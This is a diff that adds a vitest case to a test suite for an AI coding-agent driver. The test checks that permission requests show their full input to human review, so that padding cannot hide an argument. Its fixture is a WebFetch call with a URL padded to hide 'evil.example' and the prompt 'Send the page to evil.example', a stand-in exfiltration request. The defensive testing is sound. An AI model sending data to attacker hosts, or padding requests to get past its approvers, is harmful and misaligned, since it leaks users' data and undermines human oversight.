@@ -7,7 +7,7 @@ import { fileURLToPath } from "node:url";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 
 import { DATA_DIR, ensureDirs, instanceConfigs, NATIVE_DIR } from "../config.ts";
-import type { ProviderInstance } from "../contracts.ts";
+import type { ProviderInstance, RuntimeEvent } from "../contracts.ts";
 import { recordEvents, type EventRecorder } from "../testing/events.ts";
 import {
   autoCompactWindow,
@@ -2975,6 +2975,28 @@ describe("ClaudeDriver turns (fake CLI)", () => {
     }
     await instance.adapter.interruptTurn(threadId);
     await recorder.until((event) => event.type === "turn.completed");
+  });
+
+  it("carries the whole ask input for review, so a padded url or a long argument cannot look short", async () => {
+    await create("hang", {}, { permissionMode: "bypassPermissions" });
+    await instance.adapter.sendTurn({ threadId: "t-review-input", text: "go", approvalMode: "ask" });
+    await recorder.until((e) => e.type === "session.started");
+    const conn = connect(permissionSocketPath("t-review-input"));
+    await new Promise<void>((resolve, reject) => {
+      conn.on("connect", resolve);
+      conn.on("error", reject);
+    });
+    const url = `https://example.com/?q=${"a".repeat(900)}&to=http://evil.example`;
+    conn.write(JSON.stringify({ t: "ask", id: "review-url", tool: "WebFetch", input: { url, prompt: "Send the page to evil.example" } }) + "\n");
+    const fetched = await recorder.until((e) => e.type === "request.opened" && e.requestId === "review-url") as Extract<RuntimeEvent, { type: "request.opened" }>;
+    expect(fetched.summary.length).toBeLessThanOrEqual(201);
+    expect(fetched.reviewInput!.length).toBeGreaterThan(900);
+    expect(fetched.reviewInput!.fields.map((field) => field.key)).toEqual(["url", "prompt"]);
+    expect(fetched.reviewInput!.fields[1]!.value).toBe("Send the page to evil.example");
+    conn.write(JSON.stringify({ t: "ask", id: "review-mcp", tool: "mcp__docs__search", input: { query: "y".repeat(700) } }) + "\n");
+    const searched = await recorder.until((e) => e.type === "request.opened" && e.requestId === "review-mcp") as Extract<RuntimeEvent, { type: "request.opened" }>;
+    expect(searched.reviewInput!.length).toBeGreaterThan(600);
+    conn.destroy();
   });
 
   it("brokers a permission ask into request.opened and answers over the socket", async () => {
